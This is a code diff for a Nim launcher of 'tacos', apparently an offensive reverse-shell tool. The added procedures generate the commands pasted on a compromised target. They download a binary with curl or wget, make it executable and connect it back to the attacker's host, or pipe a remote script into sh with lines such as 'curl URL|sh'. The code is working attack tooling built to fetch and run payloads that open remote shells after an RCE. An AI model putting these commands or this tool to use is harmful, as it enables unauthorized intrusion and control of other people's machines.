@@ -34,6 +34,74 @@ proc cleanup():void =
     removeFile("tacos")
     #removeFile(getAppFilename()) # not needed if wrap in path
 
+# Return the command line return by th /sh endpoint (use curl)
+proc remoteCurlShCommand(downloadUrl,tunnelEndpoint,shutdownUrl,binary,secret,script,lhost:string,lport,webport:int,windows,tmp,gitar:bool):string =
+    var remoteCmd: string
+                
+    if windows:
+        if tunnelEndpoint != "":
+            remoteCmd=fmt"curl -O {downloadUrl} &&  curl {shutdownUrl} && .\\{binary} {tunnelEndpoint}"
+        else:
+            remoteCmd=fmt"curl -O {downloadUrl} && .\\{binary} {lhost}:{lport}"
+    else:
+        if tunnelEndpoint != "":
+            remoteCmd=fmt"curl -s -O {downloadUrl} &&  curl {shutdownUrl} && chmod +x {binary} && ./{binary} {tunnelEndpoint}"
+            if tmp:
+                remoteCmd=fmt"mkdir -p /tmp/tacos && curl -s -o /tmp/tacos/{binary} {downloadUrl} &&  curl {shutdownUrl} && chmod +x /tmp/tacos/{binary} && /tmp/tacos/{binary} {tunnelEndpoint}"
+        else:
+            remoteCmd=fmt"curl -s -O {downloadUrl} && chmod +x {binary} && ./{binary} {lhost}:{lport}"
+            if tmp:
+                remoteCmd=fmt"mkdir -p /tmp/tacos && curl -s -o /tmp/tacos/{binary} {downloadUrl} && chmod +x /tmp/tacos/{binary} && /tmp/tacos/{binary} {lhost}:{lport}"
+
+
+    ## Inject prepared-command within reverse shell
+    if tunnelEndpoint == "":
+        if not windows and gitar:
+            styledEcho(fgGreen,"[+] ",fgDefault,"Load gitar shortcut in reverse shell")
+            discard execCmd(fmt"sed -i 's/GITAR_SECRET/{secret}/g' {script}")
+            discard execCmd(fmt"sed -i 's/GITAR_PORT/{webport}/g' {script}")
+            discard execCmd(fmt"sed -i 's/GITAR_HOST/{lhost}/g' {script}")
+        else:
+            discard execCmd(fmt"sed -i '/GITAR_SECRET/d' {script}")
+    return remoteCmd
+
+# Return the command line to execute on target (use curl)
+proc remoteCurlCommand(shortcutUrl:string):string=
+    var remoteCmd :string
+    remoteCmd ="\nsh -c \"$(curl " & shortcutUrl & ")\"\nsh <(curl " & fmt"{shortcutUrl}" & ")\n" & fmt"curl {shortcutUrl}" & "|sh\n" #Could be cleaner
+    return remoteCmd
+
+# Return the command line return by th /sh endpoint (use curl)
+proc remoteWgetShCommand(downloadUrl,tunnelEndpoint,shutdownUrl,binary,secret,script,lhost:string,lport,webport:int,tmp,gitar:bool):string =
+    var remoteCmd: string
+
+    if tunnelEndpoint != "":
+        remoteCmd=fmt"wget -q {downloadUrl} &&  wget -O - {shutdownUrl} && chmod +x {binary} && ./{binary} {tunnelEndpoint}"
+        if tmp:
+            remoteCmd=fmt"mkdir -p /tmp/tacos && wget -q -O /tmp/tacos/{binary} {downloadUrl} &&  wget -O - {shutdownUrl} && chmod +x /tmp/tacos/{binary} && /tmp/tacos/{binary} {tunnelEndpoint}"
+    else:
+        remoteCmd=fmt"wget -q {downloadUrl} && chmod +x {binary} && ./{binary} {lhost}:{lport}"
+        if tmp:
+            remoteCmd=fmt"mkdir -p /tmp/tacos && wget -q -O /tmp/tacos/{binary} {downloadUrl} && chmod +x /tmp/tacos/{binary} && /tmp/tacos/{binary} {lhost}:{lport}"
+
+
+    ## Inject prepared-command within reverse shell
+    if tunnelEndpoint == "":
+        if gitar:
+            styledEcho(fgGreen,"[+] ",fgDefault,"Load gitar shortcut in reverse shell")
+            discard execCmd(fmt"sed -i 's/GITAR_SECRET/{secret}/g' {script}")
+            discard execCmd(fmt"sed -i 's/GITAR_PORT/{webport}/g' {script}")
+            discard execCmd(fmt"sed -i 's/GITAR_HOST/{lhost}/g' {script}")
+        else:
+            discard execCmd(fmt"sed -i '/GITAR_SECRET/d' {script}")
+    return remoteCmd
+
+# Return the command line to execute on target (use curl)
+proc remoteWgetCommand(shortcutUrl:string):string=
+    var remoteCmd :string
+    remoteCmd ="\nsh -c \"$(wget -q -O - " & shortcutUrl & ")\"\nsh <(wget -q -O - " & fmt"{shortcutUrl}" & ")\n" & fmt"wget -q -O - {shortcutUrl}" & "|sh\n" #Could be cleaner
+    return remoteCmd
+
 proc Wrap(
   bore = false, 
   ngrok = false,
@@ -43,7 +111,8 @@ proc Wrap(
   gitar = true,
   windows=false,
   tmp=false,
-  noShortcut=false
+  wget=false,
+  noShortcut=false,
   ): void =
     try:
         ## Ease the launch of socat listener waiting for tacos interactive reverse shell
@@ -63,9 +132,18 @@ proc Wrap(
         if (bore or ngrok) and lhost!="":
             styledEcho("⚠️ ",fgYellow,"--lhost has been filled but will not be used with --ngrok or --bore flags")
             quit(QuitFailure)
+        
+        if (bore or ngrok) and not gitar:
+            styledEcho("Missing flag ",fgRed,"--ngrok or --bore must be used with --gitar")
+            quit(QuitFailure)
 
         if not bore and not ngrok and lhost=="":
             styledEcho("Missing params: ",fgRed,"--lhost is missing (or --ngrok, or --bore)")
+            quit(QuitFailure)
+        
+
+        if wget and windows:
+            styledEcho("Not yet implemented ",fgRed,"--wget and --windows")
             quit(QuitFailure)
 
         ## Tmux
@@ -161,41 +239,21 @@ proc Wrap(
 
         ## Message output
         styledEcho(fgGreen,"[+] ",fgDefault,"Copy/paste following command on target and enjoy your meal 🌮:")
-        var remoteCmd: string
         var downloadUrl = fmt"{url}/pull/{binary}"
         var shutdownUrl = fmt"{url}/shutdown"
-                    
-        if windows:
-            if tunnelEndpoint != "":
-                remoteCmd=fmt"curl -O {downloadUrl} &&  curl {shutdownUrl} && .\\{binary} {tunnelEndpoint}"
-            else:
-                remoteCmd=fmt"curl -O {downloadUrl} && .\\{binary} {lhost}:{lport}"
+        var remoteCmd:string
+        if wget:
+            remoteCmd = remoteWgetShCommand(downloadUrl,tunnelEndpoint,shutdownUrl,binary,secret,script,lhost,lport,webport,tmp,gitar)
         else:
-            if tunnelEndpoint != "":
-                remoteCmd=fmt"curl -s -O {downloadUrl} &&  curl {shutdownUrl} && chmod +x {binary} && ./{binary} {tunnelEndpoint}"
-                if tmp:
-                    remoteCmd=fmt"mkdir -p /tmp/tacos && curl -s -o /tmp/tacos/{binary} {downloadUrl} &&  curl {shutdownUrl} && chmod +x /tmp/tacos/{binary} && /tmp/tacos/{binary} {tunnelEndpoint}"
-            else:
-                remoteCmd=fmt"curl -s -O {downloadUrl} && chmod +x {binary} && ./{binary} {lhost}:{lport}"
-                if tmp:
-                    remoteCmd=fmt"mkdir -p /tmp/tacos && curl -s -o /tmp/tacos/{binary} {downloadUrl} && chmod +x /tmp/tacos/{binary} && /tmp/tacos/{binary} {lhost}:{lport}"
-
-
-        ## Inject prepared-command within reverse shell
-        if tunnelEndpoint == "":
-            if not windows and gitar:
-                styledEcho(fgGreen,"[+] ",fgDefault,"Load gitar shortcut in reverse shell")
-                discard execCmd(fmt"sed -i 's/GITAR_SECRET/{secret}/g' {script}")
-                discard execCmd(fmt"sed -i 's/GITAR_PORT/{webport}/g' {script}")
-                discard execCmd(fmt"sed -i 's/GITAR_HOST/{lhost}/g' {script}")
-            else:
-                discard execCmd(fmt"sed -i '/GITAR_SECRET/d' {script}")
-
+            remoteCmd = remoteCurlShCommand(downloadUrl,tunnelEndpoint,shutdownUrl,binary,secret,script,lhost,lport,webport,windows,tmp,gitar)
         ## With shorter shortcut
         if not noShortcut:
             writeFile("sh", remoteCmd)
             let shortcutUrl = fmt"{url}/pull/sh"
-            remoteCmd = "\nsh -c \"$(curl " & shortcutUrl & ")\"\nsh <(curl " & fmt"{shortcutUrl}" & ")\n" & fmt"curl {shortcutUrl}" & "|sh\n" #Cuuld be cleaner
+            if wget:
+                remoteCmd = remoteWgetCommand(shortcutUrl)
+            else:
+                remoteCmd = remoteCurlCommand(shortcutUrl)
 
         echo ""
 
@@ -219,5 +277,7 @@ when isMainModule:
   "gitar": "use gitar as web server (also enable gitar shortcut on remote). Python server is used otherwise",
   "windows": "target windows machine",
   "tmp": "if RCE is not in a writable repository, store tacos in /tmp/tacos (only for linux)",
+  "wget": "use wget instead on target",
   "no-shortcut": "disable /sh endpoint of gitar (use longer command)",
   }
+
